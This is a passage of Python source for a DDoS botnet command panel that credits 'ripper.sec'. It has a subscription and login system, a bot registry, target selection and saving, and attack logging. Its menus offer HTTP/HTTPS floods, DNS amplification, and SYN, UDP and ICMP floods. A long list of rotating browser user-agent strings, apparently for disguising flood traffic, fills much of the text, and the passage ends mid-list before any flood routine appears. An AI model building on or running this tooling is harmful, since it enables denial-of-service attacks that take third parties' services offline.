import os
import sys
import json
from datetime import datetime, timezone
from pathlib import Path
import time
import threading

RED = '\033[91m'
GRAY = '\033[90m'
RESET = '\033[0m'

def print_loading(message, duration=1):
    """Animated loading spinner"""
    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        print(f"\r  {GRAY}{spinner[i % len(spinner)]}{RESET} {message}", end='', flush=True)
        time.sleep(0.1)
        i += 1
    print(f"\r  {RED}✓{RESET} {message}")

def print_typing(text, speed=0.03):
    """Typewriter effect"""
    for char in text:
        print(char, end='', flush=True)
        time.sleep(speed)
    print()

def print_box(text, color=RED):
    """Print text in a fancy box"""
    lines = text.split('\n')
    max_len = max(len(line) for line in lines)
    width = max_len + 4

    print(f"  {color}╔{'═' * width}╗{RESET}")
    for line in lines:
        print(f"  {color}║{RESET} {line.ljust(max_len)} {color}║{RESET}")
    print(f"  {color}╚{'═' * width}╝{RESET}")

def print_centered(text, width=60):
    """Center text"""
    padding = (width - len(text)) // 2
    return " " * padding + text

TARGETS_FILE = Path(__file__).parent / "saved_targets.json"
LOGS_DIR = Path(__file__).parent / "logs"
LOGS_DIR.mkdir(exist_ok=True)
LOG_FILE = LOGS_DIR / f"attack_log_{datetime.now().strftime('%Y%m%d')}.log"

AUTH_DIR = Path(__file__).parent / "auth_data"
AUTH_DIR.mkdir(exist_ok=True)
CREDENTIALS_FILE = AUTH_DIR / "credentials.json"

SUBSCRIPTION_DIR = Path(__file__).parent / "subscription_data"
SUBSCRIPTION_DIR.mkdir(exist_ok=True)
SUBSCRIPTION_FILE = SUBSCRIPTION_DIR / "subscription.json"

USERS_DIR = Path(__file__).parent / "users_data"
USERS_DIR.mkdir(exist_ok=True)
ONLINE_USERS_FILE = USERS_DIR / "online_users.json"

BOTS_DIR = Path(__file__).parent / "bots_data"
BOTS_DIR.mkdir(exist_ok=True)
BOTNET_BOTS_FILE = BOTS_DIR / "botnet_bots.json"

def load_credentials():
    if CREDENTIALS_FILE.exists():
        try:
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"username": "root", "password": "root"}
    else:
        default_credentials = {"username": "root", "password": "root"}
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump(default_credentials, f, indent=2)
        return default_credentials

def load_subscription():
    if SUBSCRIPTION_FILE.exists():
        try:
            with open(SUBSCRIPTION_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"access_level": "VIP", "expiry_date": None}
    else:
        default_subscription = {"access_level": "VIP", "expiry_date": None}
        with open(SUBSCRIPTION_FILE, 'w') as f:
            json.dump(default_subscription, f, indent=2)
        return default_subscription

def load_online_users():
    if ONLINE_USERS_FILE.exists():
        try:
            with open(ONLINE_USERS_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def load_botnet_bots():
    if BOTNET_BOTS_FILE.exists():
        try:
            with open(BOTNET_BOTS_FILE, 'r') as f:
                saved_bots = json.load(f)
                bots = []
                for bot in saved_bots:
                    bots.append({
                        "ip": bot.get("ip", ""),
                        "status": bot.get("status", "online"),
                        "location": bot.get("location", "Unknown"),
                        "latency": bot.get("latency", 0)
                    })
                return bots
        except Exception as e:
            print(f"{RED}[!] Error loading bots: {e}{RESET}")
            return []
    return []

def save_botnet_bots(bots):
    try:
        with open(BOTNET_BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)
    except Exception as e:
        print(f"{RED}[!] Error saving bots: {e}{RESET}")

def update_online_users(username, action="add"):
    users = load_online_users()
    if action == "add":
        if username not in users:
            users.append(username)
    elif action == "remove":
        if username in users:
            users.remove(username)
    with open(ONLINE_USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def get_subscription_expiry():
    sub = load_subscription()
    if sub.get("expiry_date"):
        expiry = datetime.fromisoformat(sub["expiry_date"])
        remaining = expiry - datetime.now(timezone.utc)
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        return f"{days}d {hours}h {minutes}m"
    return "LIFETIME"

def print_botnet_status(username, bot_count=0):
    sub = load_subscription()
    online_users = load_online_users()
    expiry = get_subscription_expiry()

    status = f"[{sub.get('access_level', 'VIP')}] {username} | Users: {len(online_users)} | Bots: {bot_count} | Expiry: {expiry} | Creator: ripper.sec"
    print(f"\033]0;{status}\007", end='', flush=True)

def print_login_ascii():
    print("\n" + GRAY + "        .                                                      ." + RESET)
    print(GRAY + "        .n                   .                 .                  n." + RESET)
    print(GRAY + "  .   .dP                  dP                   9b                 9b.    ." + RESET)
    print(GRAY + " 4    qXb         .       dX                     Xb       .        dXp     t" + RESET)
    print(GRAY + "dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb" + RESET)
    print(GRAY + "9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP" + RESET)
    print(RED + " 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP" + RESET)
    print(RED + "  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'" + RESET)
    print(RED + "    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'" + RESET)
    print(GRAY + "        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~" + RESET)
    print(GRAY + "                        )b.  .dbo.dP'`v'`9b.odb.  .dX(" + RESET)
    print(GRAY + "                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb." + RESET)
    print(GRAY + "                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb" + RESET)
    print(GRAY + "                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb" + RESET)
    print(GRAY + "                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP" + RESET)
    print(GRAY + "                     `'      9XXXXXX(   )XXXXXXP      `'" + RESET)
    print(GRAY + "                              XXXX X.`v'.X XXXX" + RESET)
    print(GRAY + "                              XP^X'`b   d'`X^XX" + RESET)
    print(GRAY + "                              X. 9  `   '  P )X" + RESET)
    print(GRAY + "                              `b  `       '  d'" + RESET)
    print(GRAY + "                               `             '" + RESET)
    print()

def login():
    credentials = load_credentials()
    max_attempts = 3
    attempts = 0

    while attempts < max_attempts:
        print_login_ascii()
        print()
        print("  " + RED + "AUTHENTICATION REQUIRED" + RESET)
        print()

        username = input("  ➤ Username: ").strip()
        password = input("  ➤ Password: ").strip()

        if username == credentials["username"] and password == credentials["password"]:
            print()
            print_loading("Authenticating...", 0.5)
            print("  " + RED + "✓" + RESET + " " + RED + "Authentication successful!" + RESET)
            update_online_users(username, action="add")
            print_botnet_status(username, 0)
            return username
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print()
            print("  " + RED + f"[!] Invalid credentials! Attempts remaining: {remaining}" + RESET)
            print()
            if remaining > 0:
                input("  ➤ Press Enter to try again...")

    print()
    print("  " + RED + "[!] Maximum login attempts exceeded. Access denied." + RESET)
    print()
    return False

def load_saved_targets():
    if TARGETS_FILE.exists():
        try:
            with open(TARGETS_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_target(target_info):
    targets = load_saved_targets()
    target_info = dict(target_info)
    target_info['saved_at'] = datetime.now(timezone.utc).isoformat()

    for index, existing in enumerate(targets):
        if existing.get('url') == target_info.get('url'):
            targets[index] = target_info
            break
    else:
        targets.append(target_info)

    with open(TARGETS_FILE, 'w') as f:
        json.dump(targets, f, indent=2)

def list_saved_targets():
    targets = load_saved_targets()
    return targets

def log_attack(attack_type, target, settings, status="started", details=None):
    timestamp = datetime.now(timezone.utc).isoformat()
    log_entry = {
        "timestamp": timestamp,
        "attack_type": attack_type,
        "target": target,
        "settings": settings,
        "status": status,
        "details": details or {}
    }

    try:
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        print(f"{RED}[!] Error writing to log file: {e}{RESET}")

def get_attack_logs():
    logs = []
    if LOG_FILE.exists():
        try:
            with open(LOG_FILE, 'r') as f:
                for line in f:
                    if line.strip():
                        logs.append(json.loads(line))
        except Exception as e:
            print(f"{RED}[!] Error reading log file: {e}{RESET}")
    return logs

def export_logs(output_file=None):
    logs = get_attack_logs()
    if not output_file:
        output_file = LOGS_DIR / f"exported_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        with open(output_file, 'w') as f:
            json.dump(logs, f, indent=2)
        print(f"{RED}[+] Logs exported to: {output_file}{RESET}")
        return output_file
    except Exception as e:
        print(f"{RED}[!] Error exporting logs: {e}{RESET}")
        return None

def clear_logs():
    try:
        if LOG_FILE.exists():
            LOG_FILE.unlink()
            print(f"{RED}[+] Log file cleared{RESET}")
        else:
            print(f"{RED}[!] No log file to clear{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error clearing logs: {e}{RESET}")

def print_header():
    print("\n" + GRAY + "        .                                                      ." + RESET)
    print(GRAY + "        .n                   .                 .                  n." + RESET)
    print(GRAY + "  .   .dP                  dP                   9b                 9b.    ." + RESET)
    print(GRAY + " 4    qXb         .       dX                     Xb       .        dXp     t" + RESET)
    print(GRAY + "dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb" + RESET)
    print(GRAY + "9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP" + RESET)
    print(RED + " 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP" + RESET)
    print(RED + "  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'" + RESET)
    print(RED + "    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'" + RESET)
    print(GRAY + "        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~" + RESET)
    print(GRAY + "                        )b.  .dbo.dP'`v'`9b.odb.  .dX(" + RESET)
    print(GRAY + "                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb." + RESET)
    print(GRAY + "                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb" + RESET)
    print(GRAY + "                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb" + RESET)
    print(GRAY + "                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP" + RESET)
    print(GRAY + "                     `'      9XXXXXX(   )XXXXXXP      `'" + RESET)
    print(GRAY + "                              XXXX X.`v'.X XXXX" + RESET)
    print(GRAY + "                              XP^X'`b   d'`X^XX" + RESET)
    print(GRAY + "                              X. 9  `   '  P )X" + RESET)
    print(GRAY + "                              `b  `       '  d'" + RESET)
    print(GRAY + "                               `             '" + RESET)
    print()

def print_layer_menu():
    print()
    print("  " + RED + "BOTNET COMMAND CENTER" + RESET)
    print()
    print("  " + GRAY + "┌─" + RESET + " " + RED + "Layer 7 (Application Layer)" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "├─" + RESET + " " + GRAY + "HTTP Flood" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "├─" + RESET + " " + GRAY + "HTTPS Flood" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "├─" + RESET + " " + GRAY + "DNS Amplification" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "└─" + RESET + " " + GRAY + "URL Flood" + RESET)
    print()
    print("  " + GRAY + "├─" + RESET + " " + RED + "Layer 4 (Transport Layer)" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "├─" + RESET + " " + GRAY + "TCP Flood (SYN)" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "├─" + RESET + " " + GRAY + "UDP Flood" + RESET)
    print("  " + GRAY + "│" + RESET + "  " + GRAY + "└─" + RESET + " " + GRAY + "ICMP Flood" + RESET)
    print()
    print("  " + GRAY + "├─" + RESET + " " + RED + "Botnet Configuration" + RESET)
    print("  " + GRAY + "├─" + RESET + " " + RED + "Target Management" + RESET)
    print("  " + GRAY + "├─" + RESET + " " + RED + "Attack Logs" + RESET)
    print("  " + GRAY + "├─" + RESET + " " + RED + "Contact Support (@ripper.sec)" + RESET)
    print("  " + GRAY + "└─" + RESET + " " + RED + "Exit System" + RESET)
    print()

def print_layer7_menu():
    print()
    print("  " + RED + "LAYER 7 ATTACKS" + RESET)
    print()
    print("    1. HTTP Flood")
    print("    2. HTTPS Flood")
    print("    3. DNS Amplification")
    print("    4. URL Flood")
    print("    5. Back to Main Menu")
    print()

def print_layer4_menu():
    print()
    print("  " + RED + "LAYER 4 ATTACKS" + RESET)
    print()
    print("    1. TCP Flood (SYN)")
    print("    2. UDP Flood")
    print("    3. ICMP Flood")
    print("    4. Back to Main Menu")
    print()

def get_target_info():
    import socket
    import re
    from urllib.parse import urlparse

    print()
    print("  " + RED + "TARGET CONFIGURATION" + RESET)
    print()

    saved_targets = list_saved_targets()
    if saved_targets:
        print("  " + RED + "Saved Targets:" + RESET)
        for i, t in enumerate(saved_targets, 1):
            print(f"  {GRAY}  {i}.{RESET} {t.get('url', 'N/A')}")
        print()
        use_saved = input("  ➤ " + GRAY + "Use saved target? (enter number or 'n' for new): " + RESET).strip()
        if use_saved.lower() != 'n':
            try:
                idx = int(use_saved) - 1
                if 0 <= idx < len(saved_targets):
                    target = saved_targets[idx]['url']
                    print(f"  {RED}[+] Using saved target: {target}{RESET}")
                    return target
            except:
                pass

    while True:
        target = input("  ➤ " + GRAY + "Enter target URL/IP: " + RESET).strip()
        if not target:
            print("\n" + RED + "  [!] Error: Target cannot be empty!" + RESET)
            continue

        try:
            parsed = urlparse(target)
            host = parsed.hostname or target
            port = parsed.port

            if not port:
                if parsed.scheme == 'https':
                    port = 443
                elif parsed.scheme == 'http':
                    port = 80
                else:
                    port = 80

            print()
            print("  " + GRAY + "Target Analysis:" + RESET)
            print("    Host: " + host)
            print("    Port: " + str(port))
            print("    Protocol: " + (parsed.scheme or 'http'))

            try:
                ip_address = socket.gethostbyname(host)
                print("    IP Address: " + ip_address)
            except:
                print("    IP Address: " + RED + "DNS resolution failed" + RESET)

            if parsed.path:
                print("    Path: " + parsed.path)
            if parsed.query:
                print("    Query: " + parsed.query)

            print("    Full URL: " + target)
            print()

            confirm = input("  ➤ " + GRAY + "Confirm target? (y/n/s to save): " + RESET).strip().lower()
            if confirm == 'y':
                return target
            elif confirm == 's':
                save_target({'url': target, 'host': host, 'port': port})
                print(f"  {RED}[+] Target saved to favorites!{RESET}")
                return target
            elif confirm == 'n':
                print()
                continue
            else:
                print("\n" + RED + "  [!] Invalid option. Please try again." + RESET)
                continue

        except Exception as e:
            print("\n" + RED + f"  [!] Error parsing target: {e}" + RESET)
            continue

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/117.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/113.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/112.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/111.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
